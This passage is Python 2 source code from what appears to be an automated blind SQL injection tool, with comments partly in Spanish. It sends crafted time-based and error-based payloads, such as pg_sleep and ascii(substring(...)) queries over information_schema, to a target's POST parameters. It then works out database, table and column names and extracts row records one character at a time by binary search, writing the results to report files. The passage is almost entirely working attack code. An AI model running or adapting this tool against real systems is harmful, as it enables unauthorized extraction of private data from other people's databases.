				#print "Mayor"
				liminf = medio
				limsup = limsup
				medio = (liminf + limsup)//2
			if limsup-1-liminf==0:
				found = True
			#sleep(0.3)
		return medio

	def LongitudRegistro(self,nr=0,lsup=200,tipo="",nbase="",ttname="",ppd="",ofset=0):
			liminf = -1
			limsup = lsup
			medio = (liminf + limsup)//2
			found = False
			kind = tipo
			while True:
				#print "LOL Time"
				#print "kind",kind
				self.dataTempo = self.datos.copy()
				if kind== "base":
					payl = self.RegisterLength.get(self.Which)
					if len(self.error) > 0:
						payl = payl.replace("and","or",1)
						payl = payl.replace("&&","||",1)
					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.time)),self.newSuffix),longi=True,cAscii=medio)
				elif kind== "tablas":
					payl = self.TableLength.get(self.Which)
					if len(self.error) > 0:
						payl = payl.replace("and","or",1)
						payl = payl.replace("&&","||",1)
					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.time)),self.newSuffix),longi=True,tname=True,nombreBase=nbase,cAscii=medio)
				elif kind == "columna":
					payl = self.ColumnLength.get(self.Which)
					if len(self.error) > 0:
						payl = payl.replace("and","or",1)
						payl = payl.replace("&&","||",1)
					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.time)),self.newSuffix),longi=True,cname=True,nombreBase=nbase,cAscii=medio,nombreTabla=ttname)
				elif kind == "Postgres":
					payl = ppd
					if len(self.error) > 0:
						payl = payl.replace("and","or",1)
						payl = payl.replace("&&","||",1)
					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl,self.newSuffix),longi=True,cAscii=medio,reina="Postgres")
				elif kind == "registros":
					payl = ppd
					if len(self.error) > 0:
						payl = payl.replace("and","or",1)
						payl = payl.replace("&&","||",1)
				 	query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.time)),self.newSuffix),longi=True,records=True,cAscii=medio,offset=ofset)

				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)

				if self.based == "time":
					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
					if (len(self.success) == 0 ) and (len(self.error) == 0):
						# Compare Baseline response against Attempt response
						cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time)))
					if len(self.success) > 0:
						# Compare if Success string is contained inside Baseline Response 
						cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
					if len(self.error) > 0:
						# Compare if Error string not appear inside Baseline Response
						cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
				else:
					if (len(self.success) == 0 ) and (len(self.error) == 0):
						cumple = Attempt.content == self.GoodRequest.content
					if len(self.success) > 0:
						cumple = self.success in Attempt.content
					if len(self.error) > 0:
						cumple = self.error not in Attempt.content

				if found:
					return medio
				#if AttemptLongi.content == self.GoodRequest.content:
				if cumple:
					#print "menor"
					liminf = liminf
					limsup = medio
					medio = (liminf + limsup)//2

				#elif not(AttemptLongi.content == self.GoodRequest.content):
				elif not cumple:
					#print "Mayor"
					liminf = medio
					limsup = limsup
					medio = (liminf + limsup)//2

				if limsup-1-liminf==0:
					found = True

	def getPostDBnames(self):
		letra = ""
		letter = ""
		print "\n"*3
		print "="*25
		print "="*3,"Guessing DB Names","="*3
		print "="*25
		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="base")
		print "Tamaño Base",tamanioRegistro
		letter = ""
		for posicion in xrange(1,tamanioRegistro+1):
			#print "LOL Time"
			liminf = 31 #48 because is number 0
			limsup = 127
			medio = (liminf + limsup)//2
			found = False
			while True:
				self.dataTempo = self.datos.copy()
				payl = self.PayloadsDBnames.get(self.Which)
				if len(self.error) > 0:
					payl = payl.replace("and","or",1)
					payl = payl.replace("&&","||",1)
				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.time)),self.newSuffix),dname=True,pos=posicion,cAscii=medio)
				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)

				if self.verbosity:
					self.showData(objeto=Attempt,Previo=False,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
				# Imprimir Respuesta
				if self.based == "time":
					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
					if (len(self.success) == 0 ) and (len(self.error) == 0):
						# Compare Baseline response against Attempt response
						cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time)))
					if len(self.success) > 0:
						# Compare if Success string is contained inside Baseline Response 
						cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
					if len(self.error) > 0:
						# Compare if Error string not appear inside Baseline Response
						cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
				else:
					if (len(self.success) == 0 ) and (len(self.error) == 0):
						cumple = Attempt.content == self.GoodRequest.content
					if len(self.success) > 0:
						cumple = self.success in Attempt.content
					if len(self.error) > 0:
						cumple = self.error not in Attempt.content

				if found:
					if chr(medio) != "," and not self.verbosity:
						self.showCharacter(chr(medio))
					else:
						print ""
					#print chr(medio),
					#print "<<<<<<<<"
					letter+=chr(medio)
					#print letter
					break
				#if self.GoodRequest.content==Attempt.text:
				if cumple:
					liminf = liminf
					limsup = medio
					medio = (liminf + limsup)//2
				#elif not(Attempt.content == self.GoodRequest.content):
				elif not cumple:
					liminf = medio
					limsup = limsup
					medio = (liminf + limsup)//2
				if (limsup-liminf)-1==0:
					found = True
		self.BDatosName = letter.split(',')
		print ""
		try:
			fdb=open(self.fullPath+"/"+self.bdXtracted,"w+")
			fdb.write(self.Which+","+",".join(self.BDatosName))
			fdb.close()
		except:
			pass
		if self.verbosity:
			for d in self.BDatosName: print "\033[1;36m"+d+"\033[0m"


	def getPostTables(self):
		print "\n"*3
		print "="*28
		print "="*3,"Guessing Tables Name","="*3
		print "="*28
		#sleep(3)
		tt = ""
		if self.Which == "Postgres": # Postgres se porta bien reina ¬¬
			tt += self.AuxiliarTablasPost()
			#print "<"*30,tt
			self.RelacionBaseTabla["postgres"]=tt.split(',')
			#print "="*80
			print ""
			#print "current_database() =>",self.RelacionBaseTabla["postgres"]
		else:
			if self.todasBases: #Cuando el usuario escribio all
				for ldbn in self.BDatosName:
					tt += self.AuxiliarTablasPost(ldbn)
					self.RelacionBaseTabla[ldbn]=tt.split(',')
					#print "="*80
					#print ldbn,"=>",self.RelacionBaseTabla[ldbn]
					print ""
			else:# Cuando el usuario escribe las bases de datos
				for ldbn in self.listaBases:
					tt += self.AuxiliarTablasPost(ldbn)
					self.RelacionBaseTabla[ldbn]=tt.split(',')
					#print "="*80
					#print ldbn,"=>",self.RelacionBaseTabla[ldbn]
					print ""
			try:
				fdb=open(self.fullPath+"/"+self.tbXtracted,"w")
				for kp in self.RelacionBaseTabla:
					fdb.write(kp+","+",".join(self.RelacionBaseTabla.get(kp)))
				fdb.close()
			except:
				pass
			if self.verbosity:
				for d in self.BDatosName: print "\033[1;36m"+d+"\033[0m"

	def AuxiliarTablasPost(self,ldbname=""):
		#print ldbname
		letter = ""
		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="tablas",nbase=ldbname)
		print "Cantidad Tablas",tamanioRegistro
		print "Checking",ldbname
		for posicion in xrange(1,tamanioRegistro+1):
			liminf = 31 #48 because is number 0
			limsup = 127
			medio = (liminf + limsup)//2
			found = False
			while True:
				self.dataTempo = self.datos.copy()
				payl = self.TablesName.get(self.Which)
				if len(self.error) > 0:
					payl = payl.replace("and","or",1)
					payl = payl.replace("&&","||",1)
				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.time)),self.newSuffix),tname=True,nombreBase=ldbname,pos=posicion,cAscii=medio)
				#print query
				#sleep(0.4)
				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)

				if self.verbosity:
					self.showData(objeto=Attempt,Previo=False,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
				# Imprimir Respuesta
				if self.based == "time":
					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
					if (len(self.success) == 0 ) and (len(self.error) == 0):
						# Compare Baseline response against Attempt response
						cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time)))
					if len(self.success) > 0:
						# Compare if Success string is contained inside Baseline Response 
						cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
					if len(self.error) > 0:
						# Compare if Error string not appear inside Baseline Response
						cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
				else:
					if (len(self.success) == 0 ) and (len(self.error) == 0):
						cumple = Attempt.content == self.GoodRequest.content
					if len(self.success) > 0:
						cumple = self.success in Attempt.content
					if len(self.error) > 0:
						cumple = self.error not in Attempt.content

				if found:
					if chr(medio) != "," and not self.verbosity:
						self.showCharacter(chr(medio))
					else:
						print ""
					letter+=chr(medio)
					break
				#if self.GoodRequest.content==Attempt.text:
				if cumple:
					liminf = liminf
					limsup = medio
					medio = (liminf + limsup)//2
#				elif not(Attempt.content == self.GoodRequest.content):
				elif not cumple:
					liminf = medio
					limsup = limsup
					medio = (liminf + limsup)//2
				if (limsup-liminf)-1==0:
					found = True
		return letter

	def QueenPostgres(self):
		liminf = 48
		limsup = 127
		medio = (limsup+liminf)//2
		found = False
		oset = 0
		cc = 0
		lta = []
		self.RelacionBaseTabla["postgres"] = self.listaTablas
		#print "<"*40,self.RelacionBaseTabla
		#Conociendo la cantidad de registros que tiene una tabla en postgres
		for t in self.RelacionBaseTabla["postgres"]:
			print "="*20
			print "="*3,t,"="*3
			print "="*20
			if self.based == "time":
				numr = self.CantidadRegistros(ppload="and(select count(column_name) from information_schema.columns where table_schema='public' and table_name='"+t+"') < {0} and (select 1 from pg_sleep(DOORMIR)) > 0".replace(self.dormir,str(self.time)))
			else:
				numr = self.CantidadRegistros(ppload="and(select count(column_name) from information_schema.columns where table_schema='public' and table_name='"+t+"') < {0}")
			cc+=1
			for oset in xrange(numr):
				letter=""
				if self.based == "time":
					tamanioRegistro = self.LongitudRegistro(nr=oset,ppd="and (select length((select column_name from information_schema.columns where table_schema='public' and table_name='"+t+"' limit 1 offset "+str(oset)+"))) < {0} and (select 1 from pg_sleep(DOORMIR)) > 0".replace(self.dormir,str(self.time)),tipo="Postgres")
				else:
					tamanioRegistro = self.LongitudRegistro(nr=oset,ppd="and (select length((select column_name from information_schema.columns where table_schema='public' and table_name='"+t+"' limit 1 offset "+str(oset)+"))) < {0}",tipo="Postgres")
				for posicion in xrange(1,tamanioRegistro+1):
					self.dataTempo = self.datos.copy()
					liminf = 48
					limsup = 127
					medio = (limsup+liminf)//2
					letra = self.ColumnsPostgresTest(ind=posicion,linea=oset,tbn=t)
					self.showCharacter(letra)
					letter+=letra
				print ""
				lta.append(letter)
				self.listaColumnas.append(letter)
			if self.verbosity:
				for alt in self.listaColumnas: print ">"*3,alt," "*2,"<"*3

	def ColumnsPostgresTest(self,linea=0,ind=1,tbn=""):
		liminf = 48
		limsup = 127
		medio = (limsup + liminf)//2
		found = False
		while True:
			self.dataTempo = self.datos.copy()
			if self.based == "time":
				 ntm = "and ascii(substring((select column_name from information_schema.columns where table_schema='public' and table_name='"+tbn+"' limit 1 offset "+str(linea)+" ),"+str(ind)+",1)) < {0} and (select 1 from pg_sleep(DOORMIR)) > 0".replace(self.dormir,str(self.time))
			else:
				ntm = "and ascii(substring((select column_name from information_schema.columns where table_schema='public' and table_name='"+tbn+"' limit 1 offset "+str(linea)+" ),"+str(ind)+",1)) < {0}"
			#print ntm
			query = self.ChangePhrase(DataPost = self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ntm,self.newSuffix),cAscii=medio,reina="Postgres",cname=True)
			#print query
			Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)

			if self.verbosity:
				self.showData(objeto=Attempt,Previo=False,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
			# Imprimir Respuesta
			if self.based == "time":
				#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
				if (len(self.success) == 0 ) and (len(self.error) == 0):
					# Compare Baseline response against Attempt response
					cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time)))
				if len(self.success) > 0:
					# Compare if Success string is contained inside Baseline Response 
					cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
				if len(self.error) > 0:
					# Compare if Error string not appear inside Baseline Response
					cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
			else:
				if (len(self.success) == 0 ) and (len(self.error) == 0):
					cumple = Attempt.content == self.GoodRequest.content
				if len(self.success) > 0:
					cumple = self.success in Attempt.content
				if len(self.error) > 0:
					cumple = self.error not in Attempt.content

			if found:
				return chr(medio)
			#if self.GoodRequest.content==Attempt.content:
			if cumple:
				liminf = liminf
				limsup = medio
				medio = (limsup + liminf)//2
			#elif not(Attempt.content==self.GoodRequest.content):
			elif not cumple:
				liminf = medio
				limsup = limsup
				medio = (limsup + liminf)//2
			if (limsup-liminf)-1==0:
				found = True

	def getPostColumns(self):
		letra = ""
		letter = ""
		print "\n"*3
		print "="*20
		print "="*3,"Getting Columns Name","="*3
		print "="*20
		sleep(3)
		if self.Which=='Postgres':
			self.QueenPostgres()
		else:
			tt = ""
			if self.todasTablas: #Cuando el usuario quiere obtener el nombre de las columnas para todas las tablas
				for ldbn in self.listaBases:
					self.listaColumnas=[]
					for TablaName in self.RelacionBaseTabla.get(ldbn):
						tt = ""
						tt += self.AuxiliarColumnasPost(ldbn,TablaName)
						self.listaColumnas = tt.split(',')
						print "="*20
						print ""
			else: # Cuando quiere obtener las columnas de las tablas que el defina
				for ldbn in self.listaBases:
					for TablaName in self.listaTablas:
						print "+"*5,TablaName,"+"*5
						tt = ""
						tt += self.AuxiliarColumnasPost(ldbn,TablaName)
						self.listaColumnas = tt.split(',')
						print ""
				try:
					fdb=open(self.fullPath+"/"+self.cnXtracted,"w")
					for ttbn in self.listaBases:
						fdb.write(ttbn+","+",".join(self.listaColumnas))
					fdb.close()
				except:
					pass

	def AuxiliarColumnasPost(self,ldbname="",tbname=""):
		#print ldbname
		letter = ""
		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="columna",nbase=ldbname,ttname=tbname)
		print "Tamanio Registro",tamanioRegistro
		#print ldbname,"=>",tbname
		for posicion in xrange(1,tamanioRegistro+1):
			liminf = 31 #48 because is number 0
			limsup = 127
			medio = (liminf + limsup)//2
			found = False
			while True:
				self.dataTempo = self.datos.copy()
				payl = self.ColumnNames.get(self.Which)
				if len(self.error) > 0:
					payl = payl.replace("and","or",1)
					payl = payl.replace("&&","||",1)
				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.time)),self.newSuffix),cname=True,nombreBase=ldbname,pos=posicion,cAscii=medio,nombreTabla=tbname)
				#print query
				#sleep(0.4)
				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)

				if self.verbosity:
					self.showData(objeto=Attempt,Previo=False,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
				# Imprimir Respuesta
				if self.based == "time":
					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
					if (len(self.success) == 0 ) and (len(self.error) == 0):
						# Compare Baseline response against Attempt response
						cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time)))
					if len(self.success) > 0:
						# Compare if Success string is contained inside Baseline Response 
						cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
					if len(self.error) > 0:
						# Compare if Error string not appear inside Baseline Response
						cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
				else:
					if (len(self.success) == 0 ) and (len(self.error) == 0):
						cumple = Attempt.content == self.GoodRequest.content
					if len(self.success) > 0:
						cumple = self.success in Attempt.content
					if len(self.error) > 0:
						cumple = self.error not in Attempt.content

				if found:
					if chr(medio) != "," and not self.verbosity:
						self.showCharacter(chr(medio))
					else:
						print ""
					letter+=chr(medio)
					break
				#if self.GoodRequest.content==Attempt.text:
				if cumple:
					liminf = liminf
					limsup = medio
					medio = (liminf + limsup)//2
				#elif not(Attempt.content == self.GoodRequest.content):
				elif not cumple:
					liminf = medio
					limsup = limsup
					medio = (liminf + limsup)//2
				if (limsup-liminf)-1==0:
					found = True
		return letter

	def getRowsRecords(self):
		print "\n"*3
		print "="*25
		print "="*3,"Getting Records","="*3
		print "="*25
		if self.todasColumnas:
			print self.listaColumnas
			for ldbn in self.listaBases: #Se recorre la lista que contiene las bases de datos
				for ttname in self.listaTablas: # Se recorre la lista que contiene las tablas deseadas
					for ccname in self.columnasElegidas:#Se recorre la lista que contiene las columnas a extraer
						#Cuenta cuantos registros tiene una columna
						#payload = self.numRegisters[self.Which]
						if self.Which=="Postgres":
							payload = self.numRegisters[self.Which].format("",ttname,"{0}")
						else:
							payload = self.numRegisters[self.Which].format(ldbn,ttname,"{0}")
						nr = self.CantidadRegistros(ppload=payload)
						for renglon in xrange(1,nr):
							#'MySQL': 'and ascii(substring((select {0} from {1}.{2} limit 1 offset {3}),{4},1)) < {5}',
							if self.Which=="Postgres":
								msg = self.RecordQuerys[self.Which].format(ccname,'',ttname,renglon,"{0}","{1}")
							msg = self.RecordQuerys[self.Which].format(ccname,ldbn,ttname,renglon,"{0}","{1}")
						print nr,"Registros"
		else:
			print self.columnasElegidas
			for ldbn in self.listaBases: #Se recorre la lista que contiene las bases de datos
				for ttname in self.listaTablas: # Se recorre la lista que contiene las tablas deseadas
					for ccname in self.columnasElegidas: #Se recorre la lista que contiene las columnas a extraer
						print "="*20
						print "="*4,ccname,"="*4
						print "="*20
						#Cuenta cuantos registros tiene una columna
						#payload = self.numRegisters[self.Which]
						if self.Which=="Postgres":
							payload = self.numRegisters[self.Which].format("",ttname,"{0}")
						else:
							payload = self.numRegisters[self.Which].format(ldbn,ttname,"{0}")
						nr = self.CantidadRegistros(ppload=payload)
						for renglon in xrange(nr):
							#'MySQL': 'and ascii(substring((select {0} from {1}.{2} limit 1 offset {3}),{4},1)) < {5}',
							if self.Which=="Postgres":
								msg = self.RecordQuerys[self.Which].format(ccname,'',ttname,renglon,"{0}","{1}")
								#print msg
							else:
								msg = self.RecordQuerys[self.Which].format(ccname,ldbn,ttname,renglon,"{0}","{1}")
							#print "Peticion",msg
							if self.Which=='Postgres':
								lengthMsg = self.TamrecordQuery[self.Which].format(ccname,'',ttname,"{0}","{1}")
							else:
								lengthMsg = self.TamrecordQuery[self.Which].format(ccname,ldbn,ttname,"{0}","{1}")
							#print lengthMsg
							longRecord = self.LongitudRegistro(tipo="registros",ofset=renglon,ppd=lengthMsg)
							#### Aqui hacemos uso de otra funciona para que busque el caracter por medio de iteraciones de la posicion y el código Ascii
							lleettrraass = self.getRecords(pppp=msg,offse=renglon,longitud=longRecord)
							self.rrecords.append(lleettrraass)
							print ""
							#print "\033[1;36m",lleettrraass,"\033[0m"
							#print ""
			try:
				fdb=open(self.fullPath+"/"+self.rcXtracted,"w")
				for cnchoose in self.columnasElegidas:
					fdb.write(cnchoose+","+",".join(self.rrecords))
				fdb.close()
			except:
				pass


	def getRecords(self,pppp="",offse="",longitud=""):
		letras = ""
		for l in xrange(1,longitud+1):
#			print pppp.format(offset,100)
			liminf = 28
			limsup = 127
			medio = (limsup + liminf)//2
			found = False
			#print "Offset: {0} Position:{1}".format(offse,l)
			#sleep(2)
			while True:
				self.dataTempo = self.datos.copy()
				payl = pppp
				if len(self.error) > 0:
					payl = payl.replace("and","or",1)
					payl = payl.replace("&&","||",1)
				query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.time)),self.newSuffix),offset=offse,pos=l,cAscii=medio,records=True)
				#print query
				#print "Offset: {0} Position:{1}".format(offse,l)
				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)

				if self.verbosity:
						self.showData(objeto=Attempt,Previo=False,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
					# Imprimir Respuesta
				if self.based == "time":
					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
					if (len(self.success) == 0 ) and (len(self.error) == 0):
						# Compare Baseline response against Attempt response
						cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time)))
					if len(self.success) > 0:
						# Compare if Success string is contained inside Baseline Response 
						cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
					if len(self.error) > 0:
						# Compare if Error string not appear inside Baseline Response
						cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
				else:
					if (len(self.success) == 0 ) and (len(self.error) == 0):
						cumple = Attempt.content == self.GoodRequest.content
					if len(self.success) > 0:
						cumple = self.success in Attempt.content
					if len(self.error) > 0:
						cumple = self.error not in Attempt.content

				if found:
					self.showCharacter(chr(medio))
					letras+=chr(medio)
					break
				#if self.GoodRequest.content==Attempt.content:
				if cumple:
					#print "Menor"
					liminf = liminf
					limsup = medio
					medio = (limsup + liminf)//2
				#elif not(Attempt.content==self.GoodRequest.content):
				elif not cumple:
					#print "Mayor"
					liminf = medio
					limsup = limsup
					medio = (limsup + liminf)//2
				if (limsup-liminf)-1==0:
					found = True
		return letras

	def Begin(self):
		try:
			#print self.based
			if self.based == "time":
				self.PayloadsAttempt = timebased.PayloadsAttempt
				self.PayloadsDBnames = timebased.PayloadsDBnames
				self.RegisterLength = timebased.RegisterLength
				self.TableLength = timebased.TableLength
				self.TablesName = timebased.TablesName
				self.ColumnLength = timebased.ColumnLength
				self.ColumnNames= timebased.ColumnNames
				self.numRegisters = timebased.numRegisters
				self.RecordQuerys = timebased.RecordQuerys
				self.TamrecordQuery = timebased.TamrecordQuery
			else:
				self.PayloadsAttempt = errorbased.PayloadsAttempt
				self.PayloadsDBnames = errorbased.PayloadsDBnames
				self.RegisterLength = errorbased.RegisterLength
				self.TableLength = errorbased.TableLength
				self.TablesName = errorbased.TablesName
				self.ColumnLength = errorbased.ColumnLength
				self.ColumnNames= errorbased.ColumnNames
				self.numRegisters = errorbased.numRegisters
				self.RecordQuerys = errorbased.RecordQuerys
				self.TamrecordQuery = errorbased.TamrecordQuery
			if self.method:#GET
				if "_sqli_" in self.server:
					direccion = self.server.replace("_sqli_","")
				else:
					direccion = self.server
				pagina = requests.get(url=direccion,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
				if self.verbosity:
					self.showData(objeto=pagina,vulnerable=True,lll=unquote(repr(self.server)))
				self.defBase(self)
				if self.manejador == "":
					print "Página no vulnerable"
				else:
					#print self.manejador
					self.getDatos(self,self.getCatalog(self,self.manejador),pagina.text,self.manejador)
				self.SentHeaders = pagina.request.headers
				self.solicitud = pagina.request.headers
				self.respuesta = pagina.content.lower()
			else: #POST Method
					if not self.YaExiste: # If not exists files with previous records
						#POST Requests
						self.PostInjection()
						# Remove Duplicate values
						self.rmDupValue()
						#Identify DB and show data injection if exists
						self.Whatis()
						if self.Which == "Unknown":
							exit(1)
						# Set a conditional to validate an existing log file generated previously
						if self.dnames:
							self.getDelimiters()
							self.getPostDBnames()
							if self.tnames:
								self.getPostTables()
						else: exit(1)
					else: # If a scanning was previously did it
						self.showData(Previo=True)
						if self.dnames:
							self.getDelimiters()
							if self.Which == 'Unknown':
								print "Target not vulnerable"
								exit(1)
							self.getPostDBnames()
						else:
							self.getDelimiters()
							if self.Which == 'Unknown':
								print "Target not vulnerable"
								exit(1)
						if self.tnames and not self.cnames and not self.rnames:
							self.getPostTables()
						if self.tnames and self.cnames and not self.rnames:
							self.getPostColumns()
						if self.tnames and self.cnames and self.rnames:
							self.getRowsRecords()
							# Hay que serializar los datos
						exit(1)
		except requests.exceptions.InvalidURL:
			print ""
			for c in "Check target syntax....":
				Cancelar("\033[1;31m"+c+"\033[0m",wait=0.009)
			print ""
			exit(1)
		except requests.exceptions.ConnectTimeout:
			print ""
			for c in "Timeout reached":
				Cancelar("\033[1;31m"+c+"\033[0m",wait=0.009)
			print ""
			exit(1)
		except requests.exceptions.ConnectionError:
			print ""
			for c in "Target unreachable (Check Networks Configurations)....":
				Cancelar("\033[1;31m"+c+"\033[0m",wait=0.009)
			print ""
			exit(1)
		except requests.exceptions.Timeout:
			print ""
			for c in "Timeout reached":
				Cancelar("\033[1;31m"+c+"\033[0m",wait=0.009)
			print ""
			exit(1)
		except requests.exceptions.TooManyRedirects:
			print ""
			for c in "Too many redirects":
				Cancelar("\033[1;31m"+c+"\033[0m",wait=0.009)
			print ""
			exit(1)
		except:
			raise
			print ""
			for c in "Woooow, something rarely has been happened, please contact with developers to solve this":
				Cancelar("\033[1;31m"+c+"\033[0m",wait=0.0009)
			print ""
			exit(1)

	def CreateFiles(self):
		try:
			self.hname = self.server.split("/")[2]
			self.aData = self.server.split("/")[3]
			self.fullPath = self.reportDir+""+self.hname+"/"+self.aData
			print self.fullPath
		except:
			print """{0} -h for help""".format(argv[0])
			exit(1)
		#########################################################################
		##  First, we check if exists files previously generated by the tools  ##
		#########################################################################
		if isdir(self.reportDir+""+self.hname):
			pass
		else:
			try:
				mkdir(self.reportDir+""+self.hname)
			except:
				pass
		if isdir(self.fullPath):
			pass
		else:
			try:
				mkdir(self.fullPath)
			except:
				pass
		if isfile(self.fullPath+"/"+self.succesfullQuery) and isfile(self.fullPath+"/"+self.dataXtracted):
			self.YaExiste = True
		else:
			try:
				f = open(self.fullPath+"/"+self.succesfullQuery,"a").close()
				f = open(self.fullPath+"/"+self.dataXtracted,"a").close()
			except:
				pass

def Opciones(argv):
	try:
		opciones, argumentos = getopt(argv[1:],"ho:v",["help","v","request=","success=","cookies=","user-agent=","method=","random-agent","data=","proxy=","columns=","tables=","server=",'dbname=','db','based=',"time=","error="])
	except GetoptError:
		print """{0} -h for help""".format(argv[0])
		exit(2)
	for opt, vals in opciones:
		#Ayuda
		if opt in ('-h','--help'):
			#print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
			print inject.Ayuda
			exit(1)
		#Server
		elif opt in ('--request'):
			print vals
			#print "{0} -> {1}".format(opt,vals)
			inject.setServer(vals)
		#User-Agent
		elif opt in ('--user-agent'):
			inject.setAgent(vals)
			#print "{0} -> {1}".format(opt,vals)
		elif opt in ('--cookies'):
			print vals
			inject.setCookie(vals)
		elif opt in ('--data'):
			inject.setData(vals)
		#User-Agent Random
		elif opt == '--random-agent':
			inject.setAgent("")
		elif opt == '--dbname':
			try:
				ddd = vals.split(',')
			except:
				ddd="all"
			inject.searchTbname(True)
			inject.setDBname(ddd)
		elif opt == '-v':
			print "Verbose"
			inject.setVerbosity(True)
		elif opt == '--db':
			inject.searchDbname(True)
		#Proxy params
		elif opt == '--proxy':
			inject.setProxy(vals)
		elif opt == '--server':
			if vals not in ('Generic','MySQL','Postgres','Mssql','Oracle'):
				print '<{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
				print "You must insert some DBs strings: "+" ,".join(('Generic','MySQL','Postgres','Mssql','Oracle'))
